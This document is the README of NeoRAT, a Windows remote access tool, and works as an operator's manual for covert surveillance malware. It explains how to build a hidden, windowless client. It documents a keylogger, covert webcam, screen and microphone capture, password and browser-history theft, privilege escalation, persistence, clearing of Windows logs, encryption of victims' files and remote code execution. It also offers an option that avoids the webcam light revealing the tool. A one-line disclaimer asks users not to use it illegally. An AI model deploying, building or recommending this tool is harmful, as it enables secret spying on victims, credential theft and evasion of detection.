# NeoRAT
Free, open-source remote access tool for Windows.

## Description
NeoRAT (2/3) hosts a TCP server allowing connections from clients. Supporting C2C with powerful features, including streams of audio, desktop, webcam & keylogger. Available through its CLI.
NeoRAT improved the quality & structure of the code compared to ExRAT. NeoRAT provides more functions, but more importantly an improved interpretation system of the commands along with greatly improved connection stability.

## Installation
* git clone https://github.com/Alvin-22/NeoRAT.git && cd NeoRAT
* pip install -r requirements.txt && pipwin install pyaudio
* start python server.py && start python client.py

## Executable
* pyinstaller -F -i [.ico filepath] server.py
* pyinstaller -F -w -i [.ico filepath] client.py

The difference between the EXE installations is that the client script is windowless (-w), becoming a background process operation without the interference of the user.

## Features
* TCP Network Stream (IPv4)
* Deflate Compression & AES128 Encryption
* Multi Threaded
* Automatic Documentation
* Stable Remote Shell
* Desktop Stream (Multi Monitor)
* Cam Stream (Multi Monitor)
* Audio Listener
* Audio Output
* Keylogger
* Screenshot
* Cam Screenshot
* Upload (Execute)
* Download (Execute)
* File Encryption / Decryption
* Keystroke & Mouse Action Injection
* Python Interpreter (Print Result to Server)
* Password Recovery ([LaZagne Project](https://github.com/AlessandroZ/LaZagne))
* Browser History Recovery ([browserhistory](https://github.com/kcp18/browserhistory))
* Privilege Escalation
* Clearing Windows Logs
* Show Messagebox
* Open Websites
* System Actions
  * Shutdown
  * Restart
  * Logout
  * Standby

## Documentation
NeoRAT operates in two modes, the first is what's called the "shell" which is the client management mode, controlling things like listing clients, deleting clients & entering session mode with clients. The second mode is the "session" mode, this is the personal interaction mode with Z client, this gives you a reverse shell along with additional commands for a more powerful data collecting experience, this would for example be streaming the clients desktop, webcam or intercepting their audio communications.

### How to construct commands in NeoRAT
Each command will be parsed & return a dictionary, the syntax for how to construct your commands correctly is as follows, first is the main command also known as the message which is the initial string, then for every argument to the command is prefixed with double dash (--). When dealing with indexes, it's all 0-based, consider 0 the first one. Commands will not care if the letters are lower / higher case unless it's specifically needed & will provide different output, an example of this is when using messagebox command, where you will need to specify the text to display, then the letter casing is taken into consideration.

An example of a command: image --screenshot --monitor 0

### Commands Available in Both Shell & Session Modes
* help
  * Show all available commands & their expected arguments. Optional arguments being surrounded by parenthesis while brackets expect variable data. Alternative uses of Z command using a pipe character (|) & commands requiring both of two arguments in conjunction with the & sign (&).

* exit
  * Exits the program, removing connections with all clients.

* clear
  * Clears the command prompt window.

* sockets
  * Displays the status of every server socket, whether it's listening for clients or not. This is also used to view all running modules (stream, cam, audio & talk) & what client of which it's running on.

* options --available | --key [key] & --value [value]
  * View available options & their current settings, then you can change that setting by specifying the name of that command. For every abstraction level displayed in the menu, the key will be sequenced. An example of setting the safe option under the mode category would look like this: options --key mode/safe --value true. This will change how the program operates so the experience is based on your terms.

* stream --ip [ip] & --port [port] | --unbind | --close [index] | --status
  * When using the stream command a subset of all available commands can be used globally. This would be binding the socket to a specific ip & port, unbinding the socket, closing a specific running instance of a stream or checking the status of the socket, whether it's listening for clients or not.

* cam --ip [ip] & --port [port] | --unbind | --close [index] | --status
  * When using the cam command a subset of all available commands can be used globally. This would be binding the socket to a specific ip & port, unbinding the socket, closing a specific running instance of a cam or checking the status of the socket, whether it's listening for clients or not.

* audio --ip [ip] & --port [port] | --unbind | --close [index] | --status
  * When using the audio command a subset of all available commands can be used globally. This would be binding the socket to a specific ip & port, unbinding the socket, closing a specific running instance of an audio or checking the status of the socket, whether it's listening for clients or not.

* talk --ip [ip] & --port [port] | --unbind | --close [index] | --status
  * When using the talk command a subset of all available commands can be used globally. This would be binding the socket to a specific ip & port, unbinding the socket, closing a specific running instance of a talk or checking the status of the socket, whether it's listening for clients or not.

### Commands Available in Shell Mode
* list
  * A very commonly used command to list all connected clients, displaying critical information in a table format.

* server --ip [ip] & --port [port] | --unbind | --status
  * This will impact the connecting of clients, to what ip & port your computer will listen on & accept clients. This is automatically bound to the address of localhost:1200.

* session --index [index]
  * This command will be used to enter a session with a specific client, enabling session mode, providing a reverse shell with additional commands. The index of the connected clients is displayed in the first column when using the list command.

* delete --index [index]
  * This will disconnect a connected client, note that all data about a client will be stored in the Aftermath directory.

### Commands Available in Session Mode
* break
  * This will break out of the session & reenter shell mode.

* uninstall
  * This will delete the client file & disconnect itself, note that this command only works if the client script is an EXE.

* reconnect
  * This will reconnect a client, creating a new instance of itself, note that this command only works if the client script is an EXE.

* cd --to [directory]
  * This will change the directory path of the session reverse shell.

* image --screenshot | --cam (--monitor [index])
  * This will take a screenshot of Z monitor / webcam & show the image on the server's computer. You can specify the monitor, by default the monitor index is 0. But it supports any monitor / webcam available.

* upload --file [filename] | --url [url] (--execute)
  * Upload a file from the server computer, this command looks for files in the Aftermath/Files directory. Alternatively you can specify a direct link to a file from the internet to use that resource. You also have the option of instantly executing the uploaded file with the --execute argument.

* download --file [file] (--execute)
  * Download a file from the client computer, this supports the local path of the session reverse shell but also absolute paths. This file will be uploaded in Aftermath/client name@client hostname/downloads directory. The --execute argument will automatically execute the file upon download.

* encrypt --file [filename] (--decrypt)
  * You can encrypt the clients files with the same encryption strength as the rest of the program with the same encryption key & salt. The encryption key & salt is specified in the domestic/global_state.py file for the server & foreign/global_state.py for the client. You can change this default key & salt, but note that the program requires having the same key & salt on both the server & the client. By also specifying the --decrypt argument, it will instead decrypt an already encrypted file.

* interpreter --execute [code] | --script [filename] (--quiet)
  * This will execute Python code directly on the clients computer, printing what would be printed on the client's computer, on the server. Unless you specify the --quiet argument. Any packages from the build of the EXE file will be available, but it does not support locally imported files. You can also specify a script file, the program looks for script files in Aftermath/Resources/Scripts.

* keylogger --run | --download (--quiet) | --close | --status
  * This will manage a keylogger, documenting the exact timestamps along with a neatly organized text structure. When the client uses space or the enter buttons, it creates a new line. All logs are stored on the client's computer, you can change the filename of the file in foreign/global_state.py. Using the --quiet argument when downloading the logs will prevent the logs from being printed, upon successful download the keylogger file will be removed.

* keystroke --inject [inject] | --script [filename]
  * A keystroke injection supports both keyboard & mouse activity, just like the interpreter command it also supports scripts located in the Aftermath/Resources/Scripts/Keystroke directory.
  * The full list of available commands in the script is:
    * press [key]
      * Press the specific key down & up.
    * hold [key]
      * Hold down a specific key.
    * release [key]
      * Release a held down key.
    * type [text]
      * Types out specified text.
    * position [x,y]
      * Move the mouse relative to the cursor x & y pixels.
    * move [x,y]
      * Move the cursor to x & y position on the screen.
    * mhold [mouse button]
      * Hold the specified mouse button down.
    * mrelease [mouse button]
      * Release the held down mouse button.
    * click [mouse button]
      * Click the specified mouse button down & up.
    * dclick [mouse button]
      * Double click the specified mouse button down & up.
    * scroll [x,y]
      * Scroll to the specified x & y pixels.
    * sleep [seconds]
      * Wait the specified seconds until continuing the script.

* persistence --elevate | --schedule | --service
  * Attempting to elevate the script's privileges will connect a new client with admin privileges if successful. Note that this command only works if the client script is an EXE. You can also schedule the script to restart upon login or have the script run as a service, note that having the program as a service will limit any general use of the application. Windows only allows non-user specific actions to done by a service, something that still works is controlling the webcam.

* system --shutdown | --restart | --logout | --standby
  * Forcing actions on the client's computer, note that using the system commands without persistence may cause the client to disconnect.

* recover --password | --history (--force) (--quiet)
  * This will attempt to recover data stored by commonly used programs on the client's computer, this will also print out the results on the server, unless the --quiet argument is specified, the --force argument is used in conjunction with the --history argument to force the browser to shutdown in case it's running. This is because you can not retrieve the browser history when it's running. Depending on the situation this may be an alternative.

* obfuscate --logs
  * This will clear the windows logs, but requires admin privileges in the session reverse shell.

* messagebox --title [title] --text [text] (--style [style])
  * Creates a popup messagebox on the client's computer, specifying the title, text & style. The style is by default an info icon.
  * The style options available are:
    * info
    * cross
    * question
    * warning

* website --open [open]
  * Opens one or more websites separated by a comma in the default browser of the client's computer.

* stream --resolution [resolution] (--monitor [index]) (--fps) (--fit) (--ip [ip] & --port [port]) (--recognize [haarcascade])
  * Stream the screen of the client's computer in the specified resolution (x,y). The --fps argument provides the fps of the stream in the top left corner, the --fit argument automatically sizes the stream window to the resolution. The --ip & --port arguments is commonly used if your server is port tunneling. The --recognize argument takes a haarcascade filepath looking for it in the Aftermath/Resources/Haarcascades directory, if you want to use any kind of image recognition on the stream.

* cam --resolution [resolution] (--monitor [index]) (--fps) (--fit) (--ip [ip] & --port [port]) (--recognize [haarcascade])
  * Stream the webcam of the client's computer in the specified resolution (x,y). The --fps argument provides the fps of the stream in the top left corner, the --fit argument automatically sizes the stream window to the resolution. The --ip & --port arguments is commonly used if your server is port tunneling. The --recognize argument takes a haarcascade filepath looking for it in the Aftermath/Resources/Haarcascades directory, if you want to use any kind of image recognition on the stream.

* audio --run (--quiet) (--ip [ip] & --port [port])
  * Listen to the audio from the microphone, if you only want to create a sound file you can specify the --quiet argument. The --ip & --port arguments is commonly used if your server is port tunneling.

* talk --run (--ip [ip] & --port [port])
  * Talk into your microphone from the server's computer & the audio will directly be played on the client's computer. The --ip & --port arguments is commonly used if your server is port tunneling.

### Available Options
* mode/safe
  * The safe mode will guarantee that any command passed to the reverse shell gets killed after X seconds. The downside is that each command will take about 2 seconds longer to respond.
  
* mode/silent
  * The silent option will not check if any webcams are available upon client connection. This is because the webcam will light up for a quick second, if there is a webcam.

* validation/duplicates
  * Will allow two connections from the same client ip to connect. Note that this option is required for the persistence --elevate command to work, as it connects the same client again, but with admin privileges.

* validation/max-clients
  * Specifies the number of clients to allow exist. Note that if there are hundreds of clients connected, the response of the program may be impacted, as the program automatically queues "keep-alive" packets every minute to prevent the clients from disconnecting without any other socket activity.

* information-gathering/history
  * Keeps a connection & disconnection log of every client with timestamps.

* information-gathering/whoami
  * Stores a file with the clients data upon connection.

* information-gathering/record/stream
  * Creates a video recording out of every client stream.

* information-gathering/record/cam-stream
  * Creates a video recording out of every client cam stream.

* information-gathering/record/audio
  * Creates an audio recording from every audio session.

* information-gathering/record/talk
  * Creates a talk recording from every talk session.

* information-gathering/save/screenshot
  * Stores all screenshots taken of clients.

* information-gathering/save/cam-screenshot
  * Stores all cam screenshots taken of clients.

* information-gathering/backup/text
  * Backup all command results sent in a session to a text file.

* information-gathering/backup/image
  * Backup all command results sent in a session to an image file.

* notice/email-notice
  * Upon client connection an email will be attempted to be sent to specified email data below. Note that all the email data will never be stored anywhere, except in the program instance.

* notice/email-data/email
  * The gmail account the email will be sent from, note that you need to allow insecure applications to use your google account in order for email notifications to work.

* notice/email-data/password
  * The password to the email specified above, note that the password will be stored as plain text in the program.

* notice/email-data/to
  * The emails to send the client connection notice to. This is separated by comma, supporting multiple emails, but may just be your own email account.

### Server command line arguments
* --ipv4 [ipv4]
  * The host server's ip address. The default is localhost.
* --port [port]
  * The host server port. The default is 1200.

### Client command line arguments
* --ipv4 [ipv4]
  * The ip address of the server. The default is localhost.
* --port [port]
  * The port of the server. Default is 1200.
---
_Please don't use NeoRAT for illegal purposes_